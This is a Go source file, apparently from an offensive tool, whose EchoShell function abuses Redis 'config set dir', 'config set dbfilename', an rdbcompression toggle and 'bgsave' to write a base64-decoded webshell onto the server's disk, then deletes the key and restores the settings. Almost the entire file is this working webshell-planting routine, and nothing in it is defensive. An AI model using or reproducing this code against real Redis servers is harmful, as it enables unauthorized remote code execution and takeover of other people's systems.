package pkg

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"
)

func EchoShell(dir, dbfilename, webshell string) {

	dir = fmt.Sprintf("config set dir %v", dir)
	dbfilename = fmt.Sprintf("config set dbfilename %v", dbfilename)

	if b64 {
		decodeBytes, err := base64.StdEncoding.DecodeString(webshell)
		if err != nil {
			fmt.Println(err)
			return
		}
		webshell = string(decodeBytes)
	}

	webshell = fmt.Sprintf("\n\n\n\n\n%v\n\n\n\n", webshell)

	RunRedisCmd(dir)
	RunRedisCmd(dbfilename)

	ctx := context.Background()
	ok, err := Rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()

	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Printf("[%v]\t%v\n", ok, "set webshell "+strings.ReplaceAll(webshell, "\n", ""))

	// 关闭redis压缩来写入文件
	compression := getRDBCompression()
	if strings.EqualFold(compression, "no") {
		RunRedisCmd("bgsave")
		RunRedisCmd("del webshell")
	} else {
		RunRedisCmd("config set rdbcompression no")
		RunRedisCmd("bgsave")
		RunRedisCmd("del webshell")
		RunRedisCmd("config set rdbcompression yes")
	}

}

func RunRedisCmd(cmd string) {
	res, err := RedisCmd(cmd)

	if err != nil {
		fmt.Printf("[%v]\t%v\n", GbkToUtf8(err.Error()), cmd)
		os.Exit(0)
	}
	fmt.Printf("[%v]\t%v\n", res, GbkToUtf8(cmd))
}

// 获取 redis 压缩是否开启
func getRDBCompression() string {
	result, err := RedisCmd("config get rdbcompression")
	if err != nil {
		fmt.Println(err)
		return "no"
	}

	if values, ok := result.([]interface{}); ok && len(values) > 1 {
		if compression, ok := values[1].(string); ok {
			return compression
		}
	}
	return "no"
}
